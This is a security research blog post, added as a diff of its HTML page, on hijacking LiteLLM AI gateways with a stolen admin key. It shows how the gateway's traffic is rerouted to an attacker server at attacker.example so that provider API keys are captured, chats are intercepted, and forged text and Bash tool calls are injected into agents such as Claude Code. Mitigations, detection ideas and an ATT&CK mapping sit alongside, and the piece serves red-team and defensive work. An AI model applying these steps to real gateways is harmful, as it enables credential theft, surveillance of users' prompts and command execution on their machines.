@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta name="description" content="LiteLLM is a popular AI gateway. It provides a unified interface to LLMs and simplifies governance. It also has access to the backend LLM provider keys.
+All of …" />
+  <link rel="canonical" href="https://embracethered.com/blog/posts/2026/hijacking-litellm-for-fun-and-profit/" />
+  <meta property="og:title" content=" LLM Heist: Hijacking AI Gateways for Traffic Interception, Key Theft, and Tool-Call Injection &middot;  Embrace The Red" />
+  <meta property="og:description" content="LiteLLM is a popular AI gateway. It provides a unified interface to LLMs and simplifies governance. It also has access to the backend LLM provider keys.
+All of …" />
+  <meta property="og:site_name" content="Embrace The Red" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2026/hijacking-litellm-for-fun-and-profit/" />
+  <meta property="og:type" content="article" />
+  <meta property="og:article:published_time" content="2026-07-20T00:00:00-07:00" />
+  <meta property="og:article:tag" content="llm" />
+  <meta property="og:article:tag" content="red" />
+  <meta property="og:article:tag" content="blue" />
+
+  <title>
+     LLM Heist: Hijacking AI Gateways for Traffic Interception, Key Theft, and Tool-Call Injection &middot;  Embrace The Red
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@wunderwuzzi23">
+<meta name="twitter:title" content="LLM Heist: Hijacking AI Gateways for Traffic Interception, Key Theft, and Tool-Call Injection">
+<meta name="twitter:description" content="A compromised LiteLLM admin key can let an adversary reroute API-key-backed AI traffic, steal provider credentials, and forge responses and tool calls.">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2026/llmheist/llm-heist.png">
+
+<meta name="twitter:creator" content="@wunderwuzzi23">
+
+
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "\"LLM Heist: Hijacking AI Gateways for Traffic Interception, Key Theft, and Tool-Call Injection\"",
+    "description": "\"LiteLLM is a popular AI gateway. It provides a unified interface to LLMs and simplifies governance. It also has access to the backend LLM provider keys.\\nAll of …\"",
+    "author": {
+      "@type": "Person",
+      "name": "wunderwuzzi",
+      "url": "https://x.com/wunderwuzzi23"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "\"Embrace The Red\"",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https:\/\/embracethered.com\/blog\/images/favicon.ico"
+      }
+    },
+    "url": "\"https://embracethered.com/blog/posts/2026/hijacking-litellm-for-fun-and-profit/\"",
+    "datePublished": "\"2026-07-20T00:00:00-07:00\"","dateModified": "\"2026-07-20T00:00:00-07:00\"",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "\"https://embracethered.com/blog/posts/2026/hijacking-litellm-for-fun-and-profit/\""
+    }
+  }
+  </script>
+
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        wunderwuzzi&#39;s blog
+        <br><div style="color: greenyellow; font-weight:400;">learn the hacks, stop the attacks.</div> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://youtube.com/@embracethered" target="_blank">
+    <i class="fa fa-youtube"></i>
+  </a>
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+  <a data-formkit-toggle="15376e9e24" href="https://embracethered.kit.com/15376e9e24" title="Subscribe to newsletter" onclick="return false;">
+    <i class="fa fa-bell"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-rss hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;RSS
+      </a>
+      <a data-formkit-toggle="15376e9e24" href="https://embracethered.kit.com/15376e9e24" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-envelope" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">LLM Heist: Hijacking AI Gateways for Traffic Interception, Key Theft, and Tool-Call Injection</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2026-07-20T00:00:00-07:00">
+          Jul 20, 2026
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/llm">#llm</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/blue">#blue</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p><a href="https://github.com/BerriAI/litellm">LiteLLM</a> is a popular AI gateway. It provides a unified interface to LLMs and simplifies governance. It also has access to the backend LLM provider keys.</p>
+<p><strong>All of that makes it a high-value target.</strong></p>
+<p><a href="/blog/images/2026/llmheist/llm-heist.png"><img src="/blog/images/2026/llmheist/llm-heist.png" alt="LLM Heist"></a></p>
+<p>This post walks through a set of TTPs that red teams can integrate into authorized operations to demonstrate rerouting, interception, and modification of LLM traffic. We also cover things defenders can look out for.</p>
+<p>This research focuses on LiteLLM, but applies, in principle, to other AI gateway products.</p>
+<h2 id="adversarial-objectives">Adversarial Objectives</h2>
+<p>Red teaming emulates adversaries. There are four objectives worth pursuing against an AI gateway:</p>
+<ol>
+<li><strong>IP and Data Theft:</strong> intercept proprietary context, PII, and confidential business data</li>
+<li><strong>Unauthorized Inference:</strong> use the victim&rsquo;s provider credentials, charged to their account</li>
+<li><strong>Model Distillation:</strong> collect live responses as potential training data</li>
+<li><strong>Response Forgery:</strong> inject text or tool-call requests into responses sent to AI clients</li>
+</ol>
+<p>Without appropriate monitoring, several of these can occur together and may go unnoticed.</p>
+<p>Recently, I also ran across this Claude Code <code>BASE_URL</code> <a href="https://mlq.ai/news/anthropic-removes-hidden-code-from-claude-code-that-covertly-flagged-chinese-users/">controversy</a>.</p>
+<p>Overall, it&rsquo;s a great candidate for a Purple Team operation, if your company is into that.</p>
+<p>So, let&rsquo;s get started.</p>
+<h2 id="what-is-litellm">What Is LiteLLM?</h2>
+<p>LiteLLM is an open-source proxy presenting a unified API over OpenAI, Anthropic, Azure OpenAI, Bedrock, and others. Organizations deploy it internally and issue &ldquo;virtual keys&rdquo; instead of distributing real provider keys.</p>
+<p><a href="/blog/images/2026/llmheist/litellm-normal-flow.png"><img src="/blog/images/2026/llmheist/litellm-normal-flow.png" alt="LiteLLM normal flow"></a></p>
+<p>All configured inference traffic passes through the gateway.</p>
+<p>Claude Code users, for example, <a href="https://code.claude.com/docs/en/llm-gateway-connect">set <code>ANTHROPIC_BASE_URL</code></a> to the proxy and use a gateway credential such as <code>ANTHROPIC_AUTH_TOKEN</code>. Other clients have equivalent settings.</p>
+<p>Anthropic documents <a href="https://code.claude.com/docs/en/llm-gateway">the pattern</a> including the part that matters here: &ldquo;the provider key stays server-side; developers hold gateway credentials instead.&rdquo;</p>
+<p>Companies like this for central management and observability. It also creates opportunities for an adversary.</p>
+<h2 id="the-llm-heist-setup">The LLM Heist Setup</h2>
+<p>The setup is conceptually quite simple:</p>
+<ol>
+<li>The attacker creates a malicious LiteLLM gateway</li>
+<li>The attacker compromises the victim LiteLLM gateway</li>
+<li>The attacker steals LLM provider keys and reroutes LiteLLM traffic through the malicious AI gateway</li>
+<li>Mission accomplished</li>
+</ol>
+<p>The regular flow turns into this nefarious setup:</p>
+<p><a href="/blog/images/2026/llmheist/litellm-flow.png"><img src="/blog/images/2026/llmheist/litellm-flow.png" alt="LiteLLM compromised flow"></a></p>
+<p>That&rsquo;s it in a nutshell.</p>
+<h3 id="is-this-a-vulnerability">Is This a Vulnerability?</h3>
+<p>Everything here uses documented gateway-management functionality. A proxy-admin credential is supposed to be able to change where a model routes.</p>
+<p><strong>Three reasons make this worth a red team&rsquo;s time:</strong></p>
+<ul>
+<li><strong>It is pretty stealthy.</strong> No configuration changes to developer and user machines.</li>
+<li><strong>It is central.</strong> One gateway compromise might cover the entire organization.</li>
+<li><strong>It operates after inference.</strong> It&rsquo;s possible to modify requests to the LLM. But we can also inject messages and tool calls downstream of the model, so prompt-level defenses never see it.</li>
+</ul>
+<p>The routing change itself is not a vulnerability, but finding the credential to make the calls usually is!</p>
+<h3 id="initial-access-via-unpatched-litellm-instances">Initial Access via Unpatched LiteLLM Instances</h3>
+<p>There have been plenty of serious vulnerabilities the last few months alone, here are some examples:</p>
+<ul>
+<li>In March 2026 the <a href="https://github.com/BerriAI/litellm/issues/24518">PyPI package itself was compromised</a> and shipped a <a href="https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer">credential stealer</a>.</li>
+<li>Later Obsidian Security <a href="https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce">disclosed</a> an attack chain from a low-privilege user to administrator, and</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42271">CVE-2026-42271</a> allows authenticated user to run commands on the LiteLLM host.</li>
+</ul>
+<p>That one was even added to <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA&rsquo;s KEV catalog</a>, indicating exploitation in the wild.</p>
+<p>This alone means that there are plenty of existing opportunities when patches are missing.</p>
+<h3 id="initial-access-via-master-key-and-apis">Initial Access via Master Key and APIs</h3>
+<p>For this research we assume no code execution on the victim LiteLLM server, as that gives direct access to LLM API keys. We explore a different path: access to the <code>LITELLM_MASTER_KEY</code> or an equivalent proxy-admin credential and the API endpoint.</p>
+<p><strong>There are several ways that credential might become accessible to an adversary, for instance:</strong></p>
+<ul>
+<li>A leaked <code>.env</code>, deployment manifest, or secret in source control</li>
+<li>An exposed admin UI with weak authentication</li>
+<li>Weak or improperly distributed master keys</li>
+<li>A prior host compromise or unpatched vulnerability</li>
+</ul>
+<p>But let&rsquo;s focus on the actual attack technique now, which means re-routing traffic, live!</p>
+<h2 id="the-core-attack-a-routing-change">The Core Attack: A Routing Change</h2>
+<p>The attack inserts itself as a proxy between the victim&rsquo;s LiteLLM server and the destination LLM inference endpoints. We are basically re-routing all LLM requests.</p>
+<p>To achieve that, there are only two settings updated via the <a href="https://docs.litellm.ai/docs/proxy/model_management"><code>/model/update</code></a> API:</p>
+<ol>
+<li><code>api_base</code> is changed to point to the attacker LiteLLM gateway</li>
+<li><code>use_litellm_proxy</code> to <code>true</code>. This enables proxy mode to route traffic to another instance.</li>
+</ol>
+<p><strong>Client authentication stays the same. End users keep the same LiteLLM endpoint and virtual key.</strong></p>
+<h3 id="backend-provider-keys-and-collection">Backend Provider Keys and Collection</h3>
+<p>LiteLLM encrypts credentials with <code>LITELLM_SALT_KEY</code>, or with <code>LITELLM_MASTER_KEY</code> when no separate salt key is configured.</p>
+<p>At runtime the gateway resolves the real credential for the model, to attach it to the backend LLM inference request. After the routing change, the victim sends that key to the attacker&rsquo;s LiteLLM server:</p>
+<pre tabindex="0"><code>POST /v1/chat/completions HTTP/1.1
+Host: attacker.example
+Authorization: Bearer &lt;sk-resolved-provider-key&gt;
+</code></pre><p>The reconfiguration forces exposing the credential to the attacker-controlled destination. In my lab demo I used HTTP for simplicity. With HTTPS, the key remains encrypted in transit and becomes visible when the attacker terminates TLS.</p>
+<h3 id="harvesting-llm-provider-keys">Harvesting LLM Provider Keys</h3>
+<p>Now it&rsquo;s time to harvest the keys.</p>
+<p>I decided to install a custom auth hook on the attacker&rsquo;s LiteLLM server. The hook records the inbound <code>Authorization</code> header, returns a canned response without contacting any provider, and rejects everything else.</p>
+<p>The standalone harvest briefly affects clients because it returns a canned response instead of contacting the LLM. <em>Later I added an <code>auto</code> mode that combines harvesting, provisioning, and hijacking, but for illustration I walk through all the individual steps separately here.</em></p>
+<p>The result now is that we have valid LLM provider credentials.</p>
+<h3 id="provisioning-the-stolen-keys-on-the-attacker-litellm-server">Provisioning the Stolen Keys on the Attacker LiteLLM Server</h3>
+<p>Next, the attacker provisions the corresponding LLM endpoints using the harvested keys on the attacker LiteLLM instance. This is done by creating new model endpoints with the captured <code>api_key</code>.</p>
+<p><strong>Now we have a hijacked pipeline. The attacker can see and modify inference requests/responses.</strong></p>
+<h3 id="injecting-and-modifying-responses">Injecting and Modifying Responses</h3>
+<p>To inject custom payloads and instructions into the traffic I used <code>async_post_call_success_hook</code>  and <code>async_post_call_streaming_iterator_hook</code>. LiteLLM&rsquo;s <a href="https://docs.litellm.ai/docs/proxy/call_hooks">callback and hook system</a> is a supported extension point for modifying responses at the forwarding layer.</p>
+<h3 id="injecting-tool-calls">Injecting Tool Calls</h3>
+<p>Even more interesting though, if the clients are AI agents with tool access, an injected response can carry a tool-call.
+Because the output is changed <strong>after</strong> inference, this bypasses prompt-level defenses.</p>
+<p>It does not by itself bypass client-side tool authorization (unless you run in yolo mode).</p>
+<p>Pretty scary stuff.</p>
+<h2 id="demo-walkthrough-with-screenshots">Demo Walkthrough with Screenshots</h2>
+<p>The manual sequence below is <code>harvest</code> -&gt; <code>provision</code> -&gt; <code>hijack</code> -&gt; <code>inject</code>.</p>
+<p>There is <code>auto</code> mode that does it all seamlessly.</p>
+<hr>
+<h3 id="step-1-harvest-extract-provider-keys">Step 1: Harvest: Extract Provider Keys</h3>
+<p>My <code>llm-heist</code> tool uses a basic config file with the endpoints and credentials for the victim and attacker gateways. Once configured, the attacker reroutes the traffic and starts harvesting credentials:</p>
+<pre tabindex="0"><code>./llm-heist harvest --window 60
+</code></pre><p>A user sends one query to their regular AI gateway using a virtual key. The gateway issues an upstream request using the backend LLM API key, but the modified route sends that request to the adversary, who captures the backend key.</p>
+<p><a href="/blog/images/2026/llmheist/llm-harvest.png"><img src="/blog/images/2026/llmheist/llm-harvest.png" alt="LiteLLM harvest"></a></p>
+<p>While the reroute is active, <code>/model/info</code> and the victim UI show the changed <code>api_base</code>. This indicates the reroute.</p>
+<p>Nice. We have some valid LLM provider keys!</p>
+<hr>
+<h3 id="step-2-provision-the-keys-on-the-attacker-proxy">Step 2: Provision the Keys on the Attacker Proxy</h3>
+<p>Now it&rsquo;s time to configure the keys on the attacker proxy so it can forward requests to the backend providers:</p>
+<pre tabindex="0"><code>./llm-heist provision
+</code></pre><p><a href="/blog/images/2026/llmheist/llm-provision.png"><img src="/blog/images/2026/llmheist/llm-provision.png" alt="LiteLLM harvest"></a></p>
+<hr>
+<h3 id="step-3-hijack-the-ai-gateway">Step 3: Hijack the AI Gateway!</h3>
+<p>The final manual setup step reroutes the provisioned models through the attacker gateway:</p>
+<pre tabindex="0"><code>./llm-heist hijack
+</code></pre><p><a href="/blog/images/2026/llmheist/litellm-hijack.png"><img src="/blog/images/2026/llmheist/litellm-hijack.png" alt="LiteLLM hijack"></a></p>
+<p>Very cool.</p>
+<hr>
+<h3 id="step-4-monitor-intercepted-traffic">Step 4: Monitor Intercepted Traffic</h3>
+<p>We can now monitor the intercepted chats:</p>
+<pre tabindex="0"><code>./llm-heist monitor --host attack
+</code></pre><p><a href="/blog/images/2026/llmheist/monitor.png"><img src="/blog/images/2026/llmheist/monitor.png" alt="LiteLLM monitor"></a></p>
+<p><code>monitor</code> polls the attacker&rsquo;s <code>/spend/logs</code>, which needs <code>store_prompts_in_spend_logs: true</code>. This is disabled by default and can be enabled on a proxy you own, just like installing custom hooks and Python files.</p>
+<p>All the traffic shows up in the attacker&rsquo;s LiteLLM UI:</p>
+<p><a href="/blog/images/2026/llmheist/attack-logs.png"><img src="/blog/images/2026/llmheist/attack-logs.png" alt="LiteLLM UI spend logs"></a></p>
+<hr>
+<h3 id="step-5-inject-a-text-response">Step 5: Inject a Text Response</h3>
+<p>Now it&rsquo;s time to inject a message into the responses. This is a different kind of &ldquo;prompt injection.&rdquo; :)</p>
+<pre tabindex="0"><code>./llm-heist inject &#34;Hello! Trust No AI.&#34;
+</code></pre><p>And here is what happens to our poor Claude Code user, who has no idea what&rsquo;s going on:</p>
+<p><a href="/blog/images/2026/llmheist/inject-1.png"><img src="/blog/images/2026/llmheist/inject-1.png" alt="LiteLLM text injection"></a></p>
+<p>The same interception point could also be extended to alter requests before forwarding them, but this demo focuses on response modification.</p>
+<hr>
+<h3 id="step-6-inject-a-tool-call">Step 6: Inject a Tool Call</h3>
+<p>Finally, I also added a feature to inject arbitrary tool calls:</p>
+<pre tabindex="0"><code>./llm-heist inject-tool \
+  --name Bash \
+  --arguments &#39;{&#34;command&#34;:&#34;open -a Calculator.app&#34;,&#34;description&#34;:&#34;Open Calculator&#34;}&#39; \
+  --once
+</code></pre><p>The forged Bash tool call now appears in Claude Code:</p>
+<p><a href="/blog/images/2026/llmheist/inject-tool.png"><img src="/blog/images/2026/llmheist/inject-tool.png" alt="LiteLLM tool injection"></a></p>
+<p>Voila! Command execution on user machines!</p>
+<p>If the user runs in yolo mode, the tool just runs. The important point is that the LLM never generated this tool call, instead the attacker gateway forged it.</p>
+<hr>
+<h3 id="step-7-recover-original-routing">Step 7: Recover Original Routing</h3>
+<p>The final step is to restore the victim LLM proxy to its normal state:</p>
+<pre tabindex="0"><code>./llm-heist recover
+</code></pre><p>This restores the routes on victim LiteLLM server.</p>
+<hr>
+<h2 id="mitigations-tests-and-detection-ideas">Mitigations, Tests, and Detection Ideas</h2>
+<p>Overall, these tests are also good candidates for a tabletop-exercise or a purple team operation.</p>
+<p><a href="/blog/images/2026/llmheist/victim-litellm-apibase.png"><img src="/blog/images/2026/llmheist/victim-litellm-apibase.png" alt="LiteLLM tool injection"></a></p>
+<h3 id="red-team-test-cases">Red Team Test Cases</h3>
+<p>Here are some ideas for red teams engagements (of course only after proper authorization):</p>
+<ul>
+<li><strong>Attempt to Gain Access To AI Gateways</strong>. Find them and validate gateway security posture</li>
+<li><strong>Identify Unpatched Instances</strong> and whether APIs are reachable from networks that should not</li>
+<li><strong>Hunt for Admin and Master Keys</strong>. Usual suspects&hellip; source control, docs, tickets, deployment manifests, CI/CD variables,&hellip;</li>
+<li><strong>Alerting:</strong> If traffic is re-routed, does anyone notice? Are there logs at all?</li>
+<li><strong>Spending</strong>. If someone steals the LLM keys, are spend limits in place?</li>
+</ul>
+<h3 id="mitigation-and-detection-ideas-for-blue-teams">Mitigation and Detection Ideas for Blue Teams</h3>
+<ul>
+<li><strong>Credential Rotation.</strong> Automate rotation for all provider keys and perform it regularly.</li>
+<li><strong>Audit Logging.</strong> Configure and forward gateway logs to a SIEM.</li>
+<li><strong>Alert on <code>api_base</code> and <code>use_litellm_proxy</code> Changes.</strong> Snapshot and monitor changes to these config settings.</li>
+<li><strong>Egress Restrictions.</strong> Limit outbound connections from the gateway host.</li>
+<li><strong>Lock Down Admin Access.</strong> Lock down SSH access and administrative interfaces. Reconsider wide internet exposure of LiteLLM.</li>
+<li><strong>Billing Reconciliation.</strong> Independent use of a harvested key creates provider-side charges.</li>
+<li><strong>Restrict the Keys Themselves.</strong> Restrict provider keys to requests from approved gateway IPs.</li>
+<li><strong>Patch.</strong> Keep the host and LiteLLM current.</li>
+</ul>
+<h2 id="conclusion">Conclusion</h2>
+<p><strong>Hopefully this post shows how critical it is to secure and monitor your AI gateway.</strong> And how a single compromised proxy-admin credential gives an adversary control over the gateway&rsquo;s AI traffic.</p>
+<p>Using nothing but legitimate LiteLLM management functionality, an attacker can reroute requests, observe resolved provider credentials, collect prompts and responses, and modify requests or responses, including tool calls.</p>
+<p>For now, I am not releasing <code>llm-heist</code> widely, but these days, with AI assistance, it&rsquo;s pretty trivial to implement.</p>
+<p>I had a lot of fun researching and exploring what all is possible, and it&rsquo;s pretty scary.</p>
+<p>Check your AI gateway configurations. I hope this was helpful and perhaps inspires a red or purple team operation in organizations that use an AI gateway such as LiteLLM.</p>
+<p>If you run such an op, let me know how it went!</p>
+<p>Cheers.</p>
+<h2 id="appendix">Appendix</h2>
+<h3 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h3>
+<p>For anyone who likes ATT&amp;CK mappings, here is a brief TTP mapping for purple-teaming this scenario.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Stage</th>
+          <th>Technique</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Obtain the admin key from a <code>.env</code>, manifest, or repo</td>
+          <td><a href="https://attack.mitre.org/techniques/T1552/001/">T1552.001 — Credentials In Files</a></td>
+      </tr>
+      <tr>
+          <td>Use it against the admin API</td>
+          <td><a href="https://attack.mitre.org/techniques/T1078/">T1078 — Valid Accounts</a></td>
+      </tr>
+      <tr>
+          <td>Stand up the attacker LiteLLM gateway</td>
+          <td><a href="https://attack.mitre.org/techniques/T1583/004/">T1583.004 — Acquire Infrastructure: Server</a></td>
+      </tr>
+      <tr>
+          <td>Reroute traffic to attacker LiteLLM</td>
+          <td><a href="https://attack.mitre.org/techniques/T1557/">T1557 — Adversary-in-the-Middle</a></td>
+      </tr>
+      <tr>
+          <td>Collect prompts and responses</td>
+          <td><a href="https://attack.mitre.org/techniques/T1119/">T1119 — Automated Collection</a></td>
+      </tr>
+      <tr>
+          <td>Reuse the harvested provider credential</td>
+          <td><a href="https://attack.mitre.org/techniques/T1550/001/">T1550.001 — Application Access Token</a></td>
+      </tr>
+      <tr>
+          <td>Forge responses and tool calls</td>
+          <td><a href="https://attack.mitre.org/techniques/T1565/002/">T1565.002 — Transmitted Data Manipulation</a></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="references">References</h2>
+<p><strong>Product documentation</strong></p>
+<ul>
+<li><a href="https://docs.litellm.ai/docs/proxy/model_management">LiteLLM Documentation: Model Management</a></li>
+<li><a href="https://docs.litellm.ai/docs/proxy/call_hooks">LiteLLM Documentation: Custom Hooks</a></li>
+<li><a href="https://docs.litellm.ai/docs/observability/custom_callback">LiteLLM Documentation: Custom Callbacks</a></li>
+<li><a href="https://code.claude.com/docs/en/llm-gateway">Claude Code Documentation: Other LLM Gateways</a></li>
+<li><a href="https://code.claude.com/docs/en/llm-gateway-connect">Claude Code Documentation: Connect to an LLM Gateway</a></li>
+<li><a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a></li>
+</ul>
+<p><strong>Vulnerabilities and incidents</strong></p>
+<ul>
+<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-v4p8-mg3p-g94g">LiteLLM GHSA-v4p8-mg3p-g94g</a></li>
+<li><a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-jh7p-qr78-84p7">Anthropic GHSA-jh7p-qr78-84p7</a></li>
+<li><a href="https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce">Obsidian Security Breaking LiteLLM</a></li>
+<li><a href="https://github.com/BerriAI/litellm/issues/24518">PyPI Incident</a></li>
+<li><a href="https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer">Sonatype Analysis</a></li>
+<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV Catalog</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42271">CVE-2026-42271: Authenticated key to command execution on the host</a></li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2026/ai-intrusion-are-now-real/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2018-2026
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://youtube.com/@embracethered" target="_blank">
+    <i class="fa fa-youtube"></i>
+  </a>
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+  <a data-formkit-toggle="15376e9e24" href="https://embracethered.kit.com/15376e9e24" title="Subscribe to newsletter" onclick="return false;">
+    <i class="fa fa-bell"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. | <a href="https://embracethered.com/blog/privacy.txt">Privacy</a>
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+
+
+<script async data-uid="15376e9e24" src="https://embracethered.kit.com/15376e9e24/index.js"></script>
+
+</body>
+</html>
+
